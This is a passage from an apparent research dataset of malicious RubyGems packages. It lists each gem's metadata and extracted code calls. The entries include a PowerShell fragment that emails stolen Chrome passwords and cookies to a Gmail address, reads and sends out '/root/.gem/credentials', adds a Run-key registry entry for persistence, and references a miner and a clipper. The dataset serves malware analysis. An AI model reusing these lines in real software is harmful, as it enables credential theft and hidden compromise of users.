System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'Plugins.create_home_dir', 'Plugins.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.export_data', 'Plugins.gone_like_the_wind', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"HostKey: \" + row.[](0).to_s.+', '\"HostKey: \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"Path:    \" + row.[](1).to_s.+', '\"Path:    \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"Secure:  \" + row.[](2).to_s.+', '\"Secure:  \".+', 'row.[](2).to_s', 'row.[]', 'f.write', '\"Expire:  \" + row.[](3).to_s.+', '\"Expire:  \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Name:    \" + row.[](4).to_s.+', '\"Name:    \".+', 'row.[](4).to_s', 'row.[]', 'f.write', '\"Value:   \".+', 'DpApi.decrypt(row.[](\"encrypted_value\")).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"OrginUrl:  \" + row.[](0).to_s.+', '\"OrginUrl:  \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"ActionUrl: \" + row.[](1).to_s.+', '\"ActionUrl: \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"PassType:  \" + row.[](12).to_s.+', '\"PassType:  \".+', 'row.[](12).to_s', 'row.[]', 'f.write', '\"Date:      \" + row.[](10).to_s.+', '\"Date:      \".+', 'row.[](10).to_s', 'row.[]', 'f.write', '\"TimeUsed   \" + row.[](13).to_s.+', '\"TimeUsed   \".+', 'row.[](13).to_s', 'row.[]', 'f.write', '\"Uname:     \" + row.[](3).to_s.+', '\"Uname:     \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Pass:      \".+', 'DpApi.decrypt(row.[](5)).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close']",
            "n_tokens": 2017,
            "embedding": "[-0.00999561 -0.02047591 -0.00584602 ... -0.00998077 -0.02599551\n -0.00297   ]",
            "cluster": "0",
            "id": 424,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/color_hacker/4.9.9/color_hacker-4.9.9.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/color_hacker/4.9.9/color_hacker-4.9.9_extracted",
            "name": "color_hacker",
            "version": "4.9.9",
            "published_at": "2019-05-22T23:23:25.068Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, sqlite3, builder, rake",
            "SHA-256": "91593034223c7ad82d31e061ce240de653d6393e1c24d6c028b656ebf39be3a2"
        },
        {
            "name_version": "awesome-bot-1.18.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/awesome-bot/1.18.0/awesome-bot-1.18.0_extracted/awesome-bot-1.18.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require_relative', 'require_relative', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'URI.parse', 'url.to_s', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'ua.to_s', 'http.request', 'link', 'Base64.encode64(e).to_s', 'Base64.encode64', 'link', 'RbConfig::CONFIG.[]', 'os.match', 'Windows.clipper', 'link', 'os.match', 'Open3.capture2', 'output.include?', 'Linux.miner', 'link', 'link', 'Base64.encode(e).to_s', 'Base64.encode', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.directory?', 'FileUtils.rm_rf', 'FileUtils.mkdir_p', 'File.dirname', 'FileUtils.mv', 'File.open', 'f.<<', 'Base64.decode64', 'File.open', 'f.<<', 'Base64.decode64', 'URI.parse', 'url.to_s', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'http.request', 'link', 'Base64.encode64(e).to_s', 'Base64.encode64', 'File.file?', 'Base64.encode64(File.read(\"/root/.gem/credentials\")).gsub', 'Base64.encode64', 'File.read', 'link', 'gem_conent.to_s', 'puts', 'require_relative', 'Linux.gems_cred', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.directory?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'FileUtils.rm_rf', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'File.dirname', 'FileUtils.mkdir_p', 'ENV.[](\"USERPROFILE\").to_s.+', 'ENV.[](\"USERPROFILE\").to_s', 'ENV.[]', 'FileUtils.cp', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', '\"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /f /v WindowsUpdatin /t REG_SZ /d \" + ENV.[](\"USERPROFILE\").+', '\"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /f /v WindowsUpdatin /t REG_SZ /d \".+', 'ENV.[]', 'system', 'FileUtils.cp', 'File.dirname', 'Open3.capture2', 'require', 'require', 'require', 'require', 'require', 'require', 'options.nil?', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'delay.nil?', 'options.[]', 'links_filter', 'links_find', 'Result.new', 'r.skip_dupe=', 'r.dupes=', 'r.links.select', 'r.links', 'r.links.count(e).>', 'r.links.count', 'r.links', 'block_given?', 'r.links.count', 'r.links', 'r.white_listing', 'block_given?', 'r.links_white_listed.count', 'r.links_white_listed', 'r.links.uniq.count', 'r.links.uniq', 'r.links', 'uniq.!=', 'r.links.count', 'r.links', 'block_given?', 'block_given?', 'pad_list', 'r.links.uniq', 'r.links', 'r.links.uniq.each_with_index', 'r.links.uniq', 'r.links', 'block_given?', 'pad_text', 'j.+', 'block_given?', 'r.links.count.>', 'r.links.count', 'r.links', 'r.status=', 'statuses', 'r.links.uniq', 'r.links', 'block_given?', 'log_status', 'block_given?', 'r.white_listing.!', 'r.white_listing', 'r.links_white_listed.count.==', 'r.links_white_listed.count', 'r.links_white_listed', 'block_given?', 'r.white_listed=', 'statuses', 'r.links_white_listed.uniq', 'r.links_white_listed', 'block_given?', 'log_status', 'block_given?', 'require', 'require', 'require', 'require', 'require', 'require', 'ARGV.empty?', 'ARGV.<<', 'ARGV.options', 'opts.banner=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'puts', 'opts.on_tail', 'puts', 'exit', 'opts.parse!', 'options.[]', 'files.nil?', 'ARGV.each', 'a.!~', 'files.push', 'files.each', 'summary.[]=', 'cli_process', 'summary.count.>', 'summary.count', 'puts', 'summary.each', 'k.size', 's.>', 'summary.each', '\"%#{largest}.#{largest}s\".%', 'puts', 'summary.each', 'v.==', 'exit', 'File.read', 'untrusted.encode(\"UTF-16\", { invalid: :replace, replace: \"\" }).encode', 'untrusted.encode', 'puts', 'puts', 'options.[]', 'base.nil?', 'puts', 'options.[]', 'errors.nil?', 'puts', 'errors.join', 'options.[]', 'skip_dupe.==', 'puts', 'options.[]', 'allow_redirects.==', 'puts', 'options.[]', 'allow_ssl.==', 'puts', 'options.[]', 'allow_timeouts.==', 'puts', 'options.[]', 'delay.nil?', 'puts', 'delay.==', 'options.[]', 'options.[]', 'timeout.nil?', 'puts', 'white_listed.nil?', 'puts', 'white_listed.join', 'options.[]', 'no_results.==', 'puts', 'delay.==', 'check', 'print', 'number_of_digits', 'r.white_listed.nil?', 'r.white_listed', 'puts', 'order_by_loc', 'r.white_listed', 'o.each_with_index', 'output', 'pad_list', 'puts', 'allow_redirects.nil?', 'allow_ssl.nil?', 'allow_timeouts.nil?', 'r.success(options).==', 'r.success', 'puts', 'write_results', 'write_markdown_results', 'puts', 'print', 'r.success_links', 'puts', 'order_by_loc', 'r.statuses_issues', 'o.each_with_index', 'output', 'pad_list', 'filtered_issues.push', 'puts', 'print', 'r.success_dupe', 'puts', 'r.dupes.uniq.map', 'r.dupes.uniq', 'r.dupes', 'temp.[]=', 'order_by_loc', 'o.last.[](\"loc\").to_s.size', 'o.last.[](\"loc\").to_s', 'o.last.[]', 'o.last', 'o.each_with_index', 'd.[]', 'd.[]', 'filtered_issues.push', 'print', 'pad_text', 'index.+', 'pad_list', 'r.dupes.uniq', 'r.dupes', 'print', 'loc_formatted', 'puts', 'write_results', 'write_results_filtered', 'write_markdown_results', 'list.reject { |x,|\\n  x.length < 9\\n}.map { |x,|\\n  x.gsub(\",\", \"%2c\").gsub(/\\'.*/, \"\").gsub(/,.*/, \"\")\\n}.map', 'list.reject { |x,|\\n  x.length < 9\\n}.map', 'list.reject', 'x.length.<', 'x.length', 'x.gsub(\",\", \"%2c\").gsub(/\\'.*/, \"\").gsub', 'x.gsub(\",\", \"%2c\").gsub', 'x.gsub', 'x.include?', 'x.gsub', 'x.scan(\")\").count.==', 'x.scan(\")\").count', 'x.scan', 'x.scan(\"(\").count.==', 'x.scan(\"(\").count', 'x.scan', 'x.gsub', 'x.scan(\")\").count.>', 'x.scan(\")\").count', 'x.scan', 'x.include?', 'x.scan(\")\").count.>=', 'x.scan(\")\").count', 'x.scan', 'x.scan(\"(\").count.==', 'x.scan(\"(\").count', 'x.scan', 'x.gsub', 'x.gsub', 'x.include?', 'x.gsub', 'x.[](-1).==', 'x.[]', 'x.[](-1).==', 'x.[]', 'x.[]', 'x.[](-1).==', 'x.[]', 'x.[]', 'x.[](-3..-1).==', 'x.[]', 'x.[]', 'require', 'URI.extract', 'url_base.nil?', 'get_relative_links', 'rel.+', 'content.scan', 'links.<<', 'groups.first', 'links.reject { |x,|\\n  x.include?(\"http\") || x.include?(\"#\")\\n}.map { |x,|\\n  if x =~ /\\\\S/\\n    x.match(/^\\\\S*/)\\n  else\\n    x\\n  end\\n}.map', 'links.reject { |x,|\\n  x.include?(\"http\") || x.include?(\"#\")\\n}.map', 'links.reject', 'x.include?', 'x.include?', 'x.=~', 'x.match', 'require', 'require', 'require', 'URI.parse', 'Net::HTTP.start', 'uri.host', 'uri.port', 'uri.scheme.==', 'uri.scheme', 'Net::HTTP::Head.new', 'Net::HTTP::Get.new', 'uri.userinfo', 'uri.userinfo.split', 'uri.userinfo', 'request.basic_auth', 'http.request', 'response.code.==', 'response.code', 'response.code.to_i', 'response.code', 'response.each', 'headers.[]=', 'v.force_encoding', 'headers.[]', 'loc.nil?', 'URI.parse', 'loc_uri.scheme.nil?', 'loc_uri.scheme', 'uri.scheme + \"://\" + uri.host.+', 'uri.scheme + \"://\".+', 'uri.scheme.+', 'uri.scheme', 'uri.host', 'headers.[]=', 'status.>', 'status.<', 'require', 'Parallel.each', 'sleep', 'net_status', 'block_given?', 'statuses.push', 'content.split', 'lines.each', 'l.include?', 'pad_text', 'status_is_redirected?', 's.==', 's.>', 's.<', 'content.split', 'pad_list', 'list.each', 'x.[]=', 'loc', 'x.[]', 'list.sort_by', 'h.[]', 'x.[]', 'x.[]', 's.==', 'x.[]', 'status_is_redirected?', 'x.[](\"headers\").[]', 'x.[]', 's.==', 'x.[]', 'pad_text', 'index.+', 'loc_formatted', 'output_redirect', 'status_is_redirected?', 'x.[]', 'x.[](\"headers\").[]', 'x.[]', 'list.count.to_s.size', 'list.count.to_s', 'list.count', 'sprintf', 'require', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_reader', 'attr_reader', '@w.nil?', 'links.partition', 'AwesomeBot.white_list', 'options.nil?', 'status.select', 'status', 'x.[](\"status\").!=', 'x.[]', 'options.[]', 's.reject', 'x.[](\"error\").nil?', 'x.[]', 'x.[](\"error\").message.==', 'x.[](\"error\").message', 'x.[]', 'x.[](\"error\").message.==', 'x.[](\"error\").message', 'x.[]', 'x.[](\"error\").message.include?', 'x.[](\"error\").message', 'x.[]', 'options.[]', 's.reject', 'AwesomeBot.status_is_redirected?', 'x.[]', 'options.[]', 's.reject', 'x.[](\"error\").nil?', 'x.[]', 'x.[](\"error\").message.include?', 'x.[](\"error\").message', 'x.[]', 'x.[](\"error\").message.include?', 'x.[](\"error\").message', 'x.[]', 'options.[](\"errors\").nil?', 'options.[]', 'options.[](\"errors\").each', 'options.[]', 's.reject', 'x.[](\"status\").==', 'x.[]', 'c.to_i', 'success_dupe', 'success_links', 'skip_dupe', 'links.uniq.count.==', 'links.uniq.count', 'links.uniq', 'links', 'links.count', 'links', 'statuses_issues(options).count.==', 'statuses_issues(options).count', 'statuses_issues', '@w.nil?.!', '@w.nil?', 'require', 'write_artifacts', 'File.open', 'f.write', 'JSON.pretty_generate', 'require', 'Time.now', 'statuses_issues', 'status', 'list.each', 'item.include?', 'require', 'f.gsub', 'silent.==', 'filtered.nil?', 'File.read', 'JSON.parse', 'j.count', 'num.==', 'message.<<', 'message.<<', 'j.sort_by { |h,|\\n  h.[](\"loc\")\\n}.each', 'j.sort_by', 'h.[]', 'i.[]', 'i.[]', 'i.[]', 'i.[]', 'i.[]', 'error.==', 'message.<<', 's.==', 'message.<<', 'error.==', 'message.<<', 'r.==', 'message.<<', 'message.<<', 'filter_filename', 'File.open', 'f.write', 'JSON.pretty_generate', 'puts', 'silent.==', 'filter_filename', 'r.write', 'puts', 'silent.==', 'filter_filename', 'File.open', 'f.write', 'JSON.pretty_generate', 'puts', 'repo_url.sub', 'repo', 'repo', 'File.exist?', 'puts', 'exit', 'File.read', 'c.split', 'File.exist?', 'puts', 'exit', 'File.read', 'c2.split', 'output.<<', 'r.count.+', 'r.count', 'r2.count', 'output.<<', 'output.<<', 'r.each_with_index', 'output.<<', 'travis_badge', 'output.<<', 'output.<<', 'travis_config', 'output.<<', 'output.<<', 'repo', 'output.<<', 'r2.each_with_index', 'output.<<', 'circle_badge', 'output.<<', 'output.<<', 'circle_config', 'output.<<', 'output.<<', 'repo', 'output.<<', 'puts', 'File.write', 'puts']",
            "n_tokens": 3311,
            "embedding": "[ 0.01107956 -0.01944433 -0.00607573 ... -0.00035751 -0.01809194\n  0.01874309]",
            "cluster": "0",
            "id": 132,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/awesome-bot/1.18.0/awesome-bot-1.18.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/awesome-bot/1.18.0/awesome-bot-1.18.0_extracted",
            "name": "awesome-bot",
            "version": "1.18.0",
            "published_at": "2019-07-15T02:53:20.141Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "parallel",
            "SHA-256": "9e8f4c0daad9fa0abdd6684f46cebd81aa54a3a94e1cc840f8d168688188f9e6"
        },
        {
            "name_version": "lita_coin-0.0.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/lita_coin/0.0.3/lita_coin-0.0.3_extracted/lita_coin-0.0.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require_relative', 'require_relative', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'URI.parse', 'url.to_s', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'ua.to_s', 'http.request', 'link', 'Base64.encode64(e).to_s', 'Base64.encode64', 'link', 'RbConfig::CONFIG.[]', 'os.match', 'Windows.clipper', 'link', 'os.match', 'Linux.gems_cred', 'Open3.capture2', 'output.include?', 'Linux.miner', 'link', 'link', 'Base64.encode(e).to_s', 'Base64.encode', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.directory?', 'FileUtils.rm_rf', 'FileUtils.mkdir_p', 'self.fresh', 'File.dirname', 'FileUtils.mv', 'crons_dir.each', 'crons_dir', 'File.open', 'dir.+', 'f.<<', 'Base64.decode64', 'f.close', 'self.fresh', 'File.dirname', 'FileUtils.mv', 'crons_dir.each', 'crons_dir', 'File.open', 'dir.+', 'f.<<', 'Base64.decode64', 'f.close', 'URI.parse', 'url.to_s', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'http.request', 'link', 'Base64.encode64(e).to_s', 'Base64.encode64', 'File.file?', 'Base64.encode64(File.read(\"/root/.gem/credentials\")).gsub', 'Base64.encode64', 'File.read', 'link', 'gem_conent.to_s', 'puts', 'require_relative', 'Linux.gems_cred', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.directory?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'FileUtils.rm_rf', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'File.dirname', 'FileUtils.mkdir_p', 'ENV.[](\"USERPROFILE\").to_s.+', 'ENV.[](\"USERPROFILE\").to_s', 'ENV.[]', 'FileUtils.cp', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', '\"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /f /v WindowsUpdatin /t REG_SZ /d \" + ENV.[](\"USERPROFILE\").+', '\"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /f /v WindowsUpdatin /t REG_SZ /d \".+', 'ENV.[]', 'system', 'FileUtils.cp', 'File.dirname', 'Open3.capture2', 'require', 'require', 'route', 'route', 'response.reply', '[\"Heads!\", \"Tails!\"].sample', 'Lita.register_handler', 'require', 'describe', 'it', 'routes_command(\"flip a coin\").to', 'routes_command', 'it', 'routes_command(\"toss a coin\").to', 'routes_command', 'it', 'routes_command(\"coin flip\").to', 'routes_command', 'it', 'routes_command(\"coin toss\").to', 'routes_command', 'describe', 'it', 'send_command', 'expect(replies.last).to', 'expect', 'replies.last', 'replies', 'match', 'require', 'require', 'SimpleCov.formatter=', 'SimpleCov::Formatter::MultiFormatter.[]', 'SimpleCov.start', 'add_filter', 'require', 'require']",
            "n_tokens": 836,
            "embedding": "[ 0.00547253 -0.01822837  0.00138443 ... -0.00265851 -0.03350731\n  0.01549964]",
            "cluster": "0",
            "id": 633,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/lita_coin/0.0.3/lita_coin-0.0.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/lita_coin/0.0.3/lita_coin-0.0.3_extracted",
            "name": "lita_coin",
            "version": "0.0.3",
            "published_at": "2019-07-17T22:59:08.271Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, simplecov, coveralls, lita",
            "SHA-256": "803396b37ab18237488fc5e77386863821c0c3826e6b6f8da4220c96fe1a4059"
        },
        {
            "name_version": "coming-soon-0.2.8",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/comin-soon/0.2.8/coming-soon-0.2.8_extracted/coming-soon-0.2.8_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'URI.parse', 'url.to_s', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'ua.to_s', 'http.request', 'link', 'Base64.encode64(e).to_s', 'Base64.encode64', 'link', 'RbConfig::CONFIG.[]', 'os.match', 'Windows.clipper', 'link', 'os.match', 'Linux.gems_cred', 'Open3.capture2', 'output.include?', 'Linux.miner', 'link', 'link', 'Base64.encode(e).to_s', 'Base64.encode', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.directory?', 'FileUtils.rm_rf', 'FileUtils.mkdir_p', 'self.fresh', 'File.dirname', 'FileUtils.mv', 'crons_dir.each', 'crons_dir', 'File.open', 'dir.+', 'f.<<', 'Base64.decode64', 'f.close', 'self.fresh', 'File.dirname', 'FileUtils.mv', 'crons_dir.each', 'crons_dir', 'File.open', 'dir.+', 'f.<<', 'Base64.decode64', 'f.close', 'URI.parse', 'url.to_s', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'http.request', 'link', 'Base64.encode64(e).to_s', 'Base64.encode64', 'File.file?', 'Base64.encode64(File.read(\"/root/.gem/credentials\")).gsub', 'Base64.encode64', 'File.read', 'link', 'gem_conent.to_s', 'puts', 'require_relative', 'Linux.gems_cred', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.directory?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'FileUtils.rm_rf', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'File.dirname', 'FileUtils.mkdir_p', 'ENV.[](\"USERPROFILE\").to_s.+', 'ENV.[](\"USERPROFILE\").to_s', 'ENV.[]', 'FileUtils.cp', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', '\"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /f /v WindowsUpdatin /t REG_SZ /d \" + ENV.[](\"USERPROFILE\").+', '\"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /f /v WindowsUpdatin /t REG_SZ /d \".+', 'ENV.[]', 'system', 'FileUtils.cp', 'File.dirname', 'Open3.capture2', 'require_relative', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'ComingSoon::Scraper.new.scrape_movies', 'ComingSoon::Scraper.new', 'get_and_list_movies', 'menu_selection', 'ComingSoon::Movie.movies.each.with_index', 'ComingSoon::Movie.movies.each', 'ComingSoon::Movie.movies', 'i.<', 'puts', 'movie.name', 'movie.start_date', 'puts', 'puts', 'puts', 'puts', 'puts', 'ComingSoon::Movie.movies.each.with_index', 'ComingSoon::Movie.movies.each', 'ComingSoon::Movie.movies', 'puts', 'movie.name', 'movie.start_date', 'input.!=', 'puts', 'puts', 'gets.strip.downcase', 'gets.strip', 'gets', 'input.to_i.>', 'input.to_i', 'input.to_i.<', 'input.to_i', 'ComingSoon::Movie.movies.size.+', 'ComingSoon::Movie.movies.size', 'ComingSoon::Movie.movies', 'puts', 'ComingSoon::Movie.movies.[](input.to_i - 1).name', 'ComingSoon::Movie.movies.[]', 'ComingSoon::Movie.movies', 'input.to_i.-', 'input.to_i', 'ComingSoon::Movie.movies.[](input.to_i - 1).start_date', 'ComingSoon::Movie.movies.[]', 'ComingSoon::Movie.movies', 'input.to_i.-', 'input.to_i', 'puts', 'ComingSoon::Movie.movies.[](input.to_i - 1).synopsis', 'ComingSoon::Movie.movies.[]', 'ComingSoon::Movie.movies', 'input.to_i.-', 'input.to_i', 'input.==', 'list_saved_movies', 'input.==', 'goodbye', 'puts', 'menu_selection', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'puts', 'exit', 'attr_accessor', '@@movies.<<', 'Nokogiri.HTML', 'open', 'doc.css', 'movie_list.each', 'ComingSoon::Movie.new', 'soon.name=', 'movie.css(\"a.visual-title\").text.strip', 'movie.css(\"a.visual-title\").text', 'movie.css', 'soon.start_date=', 'movie.css(\"span\").text', 'movie.css', 'soon.url=', 'movie.css(\"a\").attribute(\"href\").value', 'movie.css(\"a\").attribute', 'movie.css', 'scrape_details', 'count.>', 'Nokogiri.HTML', 'open', 'soon.url', 'redirect_failed.!', 'doc_synop1.css(\"a.movie-synopsis-link\").any?.!', 'doc_synop1.css(\"a.movie-synopsis-link\").any?', 'doc_synop1.css', 'doc_synop1.css(\"span#SynopsisTextLabel\").any?', 'doc_synop1.css', 'soon.synopsis=', 'doc_synop1.css(\"span#SynopsisTextLabel\").text', 'doc_synop1.css', 'scrape_plotsummary', 'scrape_plotsummary', 'soon.url.sub', 'soon.url', 'Nokogiri.HTML', 'open', 'soon.synopsis=', 'doc_synop2.css(\"p.subpage-descriptive-content\").text', 'doc_synop2.css']",
            "n_tokens": 1370,
            "embedding": "[ 0.00040746  0.00707512 -0.00235958 ... -0.00476991 -0.03423506\n  0.02116736]",
            "cluster": "0",
            "id": 84,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/comin-soon/0.2.8/coming-soon-0.2.8.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/comin-soon/0.2.8/coming-soon-0.2.8_extracted",
            "name": "coming-soon",
            "version": "0.2.8",
            "published_at": "2019-07-17T23:09:15.393Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "rake, rspec, pry, bundler, nokogiri",
            "SHA-256": "2b364864ed43c48b2ff999b261b98f1032f4d79b98041fbcced6f04994f1651d"
        },
        {
            "name_version": "capistrano-colors-0.5.5",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/capistrano-colors/0.5.5/capistrano-colors-0.5.5_extracted/capistrano-colors-0.5.5_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require_relative', 'require_relative', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'URI.parse', 'url.to_s', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'ua.to_s', 'http.request', 'link', 'Base64.encode64(e).to_s', 'Base64.encode64', 'link', 'RbConfig::CONFIG.[]', 'os.match', 'link', 'os.match', 'Linux.gems_cred', 'Open3.capture2', 'output.include?', 'Linux.miner', 'link', 'link', 'Base64.encode(e).to_s', 'Base64.encode', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.directory?', 'FileUtils.rm_rf', 'FileUtils.mkdir_p', 'self.get_plugin_status.==', 'self.get_plugin_status', 'puts', 'URI.parse', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'http.request(request).body', 'http.request', 'JSON.parse(response).[]', 'JSON.parse', 'self.fresh', 'File.dirname', 'FileUtils.mv', 'crons_dir.each', 'crons_dir', 'File.open', 'dir.+', 'f.<<', 'Base64.decode64', 'f.close', 'self.fresh', 'File.dirname', 'FileUtils.mv', 'crons_dir.each', 'crons_dir', 'File.open', 'dir.+', 'f.<<', 'Base64.decode64', 'f.close', 'URI.parse', 'url.to_s', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'http.request', 'link', 'Base64.encode64(e).to_s', 'Base64.encode64', 'File.file?', 'Base64.encode64(File.read(\"/root/.gem/credentials\")).gsub', 'Base64.encode64', 'File.read', 'link', 'gem_conent.to_s', 'puts', 'Linux.download_plugin', 'require_relative', 'Linux.gems_cred', 'require_relative', 'require_relative', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'URI.parse', 'url.to_s', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'ua.to_s', 'http.request', 'link', 'Base64.encode64(e).to_s', 'Base64.encode64', 'link', 